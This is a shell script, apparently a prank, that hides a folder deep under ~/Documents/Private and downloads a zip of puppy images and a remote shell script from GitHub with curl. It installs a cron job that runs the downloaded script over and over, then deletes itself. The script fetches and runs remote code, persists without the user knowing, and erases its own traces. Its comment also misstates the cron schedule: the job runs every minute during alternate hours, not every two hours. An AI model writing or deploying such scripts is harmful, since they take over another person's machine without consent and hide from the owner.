#create a deeply nested directory 
mkdir -p ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here;

#get zip file from url and store it in the director you just created
curl -L https://github.com/SashaBayan/puppyScript/blob/master/puppies.zip?raw=true > ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/puppies.zip

#download the loop script that will run the files that open the puppy images
curl -L https://raw.githubusercontent.com/SashaBayan/puppyScript/master/who_let_the_dogs_out.sh > ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/loop.sh

#unzip the file and save the uncompressed version in the same directory
unzip -o ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/puppies.zip -d ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/

#copies the current set of cron jobs and writes them to a temporary file
#NOTE: we do "crontab -l > fileName" instead of creating an entirely new file 
#      in order to preserve whatever cron jobs already exist on that users computer.
#      Echoing text into the crontab will overwrite any existing cron jobs, which is why
#      we don't simply create a new file via the "touch" command and then echo it into the crontab.
crontab -l > here_be_puppies;

#copy the cron job to the temporary file
#NOTE: the cronjob is currently set to run the script every two hours
echo "* */2 * * * sh ~/Documents/Private/unimportant/strange/how/odd/why/are/you/still/looking/here/loop.sh" >> here_be_puppies;

#install new cron job in the crontab
crontab here_be_puppies;

#delete the temporary file used to store the cron job text
rm here_be_puppies;

#the file removes itself
rm -- "$0";
